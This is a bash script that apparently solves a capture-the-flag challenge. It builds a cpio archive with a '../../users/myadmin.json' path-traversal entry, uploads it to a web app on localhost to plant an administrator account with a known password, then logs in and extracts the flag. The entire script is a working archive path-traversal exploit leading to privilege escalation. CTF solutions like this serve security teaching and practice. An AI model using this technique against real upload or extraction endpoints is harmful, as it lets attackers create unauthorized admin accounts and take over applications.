#!/bin/bash

# build the malicious cpio archive
mkdir users
# our user json
echo '{"passhash":"'`echo -n admin|sha256sum|cut -d' ' -f1`'","perm_level":3}' > users/myadmin.json
# add it at "../../users/myadmin.json"
mkdir a
mkdir a/b
cd a/b
echo "../../users/myadmin.json" | cpio -ov -H newc -O ../../archive.cpio
cd ../..
# cleanup
rm -r a
rm -r users

# Interact with the server to get the flag
# Register a new user so we can upload our payload
curl -L http://localhost:8000/register -c basic_user_cookie_jar -d 'user=mybasicuser&password1=pass&password2=pass'
# upload our payload
curl -L http://localhost:8000/archive -b basic_user_cookie_jar -F 'file=@./archive.cpio'
# log in with our added user
curl -L http://localhost:8000/login -c admin_user_cookie_jar -d 'user=myadmin&password=admin'
# get the flag
adminpage=$(curl http://localhost:8000/admin -b admin_user_cookie_jar)
# cut the flag out out of the webpage
flag=${adminpage#*\'}
flag=${flag%\'*}
# print the flag
echo Flag:
echo $flag | base64 -d
echo
#cleanup
rm *_cookie_jar
rm archive.cpio
